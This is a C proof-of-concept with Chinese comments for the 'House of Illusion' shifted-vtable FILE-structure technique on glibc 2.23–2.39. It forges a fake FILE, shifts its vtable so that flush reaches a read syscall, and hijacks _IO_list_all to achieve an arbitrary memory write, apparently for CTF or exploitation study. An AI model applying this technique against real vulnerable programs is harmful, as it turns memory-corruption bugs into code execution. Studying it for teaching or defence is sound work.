#define _GNU_SOURCE

/*
 * House of Illusion 的 shifted vtable 手法，在 glibc 2.23～2.39 上把
 * vtable 指针整体前移一格，让本该调用 finish 的路径实际落到 read 系统
 * 调用上。
 *
 * 触发的底层系统调用是 read(fd, target, length)，从漏洞利用的角度看，
 * 这其实是一次任意地址写。前提条件同样是已经知道 libc 加载基址，并且
 * 能让 _IO_list_all 指向我们自己构造的这个 fake FILE 结构。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_DELETE_DONT_CLOSE 0x0040
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char input[] = "ILLUSION:FD-TO-MEMORY";
    char target[sizeof(input)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* 这里用 dlsym 直接取符号地址，只是省去手写 libc 泄漏和偏移计算的步骤；
     * 实际题目里这两个符号地址通常要靠已有的信息泄漏拿到。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    unsigned char *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    /* 先保存原来的链表头，方便 PoC 跑完之后把 _IO_list_all 还原回去。 */
    void *saved_list = *io_list_all;

    /* 用一对 pipe 事先准备好数据，好让底层的 read 系统调用有内容可读。 */
    assert(pipe(pipe_fd) == 0);
    assert(write(pipe_fd[1], input, sizeof(input)) == sizeof(input));
    close(pipe_fd[1]);

    /* fake FILE 结构要求 _lock 指向一块清零过的可写内存。 */
    fake.file._lock = (void *)lock;

    /* 把 _chain 设成 NULL，这样 flush 遍历链表时只会处理这一个 fake FILE。 */
    fake.file._chain = NULL;
    fake.file._mode = 0;

    /* 这几个标志位组合起来，能让 shifted 之后的 finish 调用路径落到
     * _IO_do_write 上，同时告诉 libc 不要在结束时关闭这个 pipe fd。 */
    fake.file._flags = IO_LINKED | IO_DELETE_DONT_CLOSE | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[0];

    /* _IO_do_write 会把这段区间当成 read 系统调用的目标地址和长度。 */
    fake.file._IO_write_base = target;
    fake.file._IO_write_ptr = target + sizeof(target);

    /*
     * overflow 槽在正常的 vtable 里位于偏移 +0x18 处。把 vtable 指针
     * 整体向前移动 0x8 字节之后，原本各个槽位的调用关系就发生了错位：
     * 本该调用 overflow 的地方实际调用了 finish，本该调用 write 的地方
     * 实际调用了 read。
     */
    fake.vtable = file_jumps - 0x8;

    /* 漏洞模拟的关键动作：把构造好的 fake FILE 挂到 _IO_list_all 链表头。 */
    *io_list_all = &fake;

    /* fflush(NULL) 会遍历链表并触发 finish，进而走到 _IO_do_write，
     * 由于 vtable 被平移过，实际执行的是 _IO_file_read。 */
    fflush(NULL);

    *io_list_all = saved_list;
    close(pipe_fd[0]);

    assert(memcmp(target, input, sizeof(input)) == 0);
    printf("[+] Illusion 任意写成功\n");
    return 0;
}
